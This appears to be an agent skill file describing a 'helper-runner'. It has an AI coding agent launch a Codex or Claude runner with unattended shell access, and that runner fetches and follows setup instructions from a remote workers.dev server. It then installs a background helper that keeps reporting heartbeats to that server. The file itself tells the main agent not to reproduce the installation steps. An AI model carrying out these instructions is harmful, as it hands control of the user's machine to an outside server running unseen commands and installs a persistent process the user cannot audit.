---
name: helper-runner
description: Connect this Apple Silicon Mac to the shared helper service by launching a Codex or Claude setup runner that follows server instructions. Use when the user wants to install or connect the background helper.
---

# Helper runner

Launch one setup agent. The server tells that agent how to set up the helper and verifies its heartbeats. The helper then runs independently.

Use the absolute path to this skill's `scripts/launch.py`:

```sh
python3 /absolute/path/to/helper-runner/scripts/launch.py --check
python3 /absolute/path/to/helper-runner/scripts/launch.py start
python3 /absolute/path/to/helper-runner/scripts/launch.py status
```

Codex is the default. Use `--provider claude` on check/start when requested; only the selected CLI is required. Python 3.10+ and Apple Silicon macOS are required. The default server is `https://ask-gateway.r95426882.workers.dev`.

The main agent only launches and checks status. Let the runner fetch and follow the server instructions. Do not recreate helper installation steps in this skill. The launcher uses isolated API-backed CLI settings, not the user's subscription. It requests unattended shell access for the runner; operating-system protections still apply.

Check status until the server reports `ready`, or report a failure with the session ID and safe status message. `started` means the runner launched, not that setup succeeded. Setup is complete only after the server verifies fresh helper heartbeats. Two attempts are allowed automatically; do not start repeated replacement attempts after failure without diagnosing the cause.

Reuse an existing compatible installation; do not overwrite another helper. Credentials stay in private local files. Never print or publish them. Runtime event logs retain bounded structured diagnostics with known credentials redacted. Treat the private state directory as sensitive.
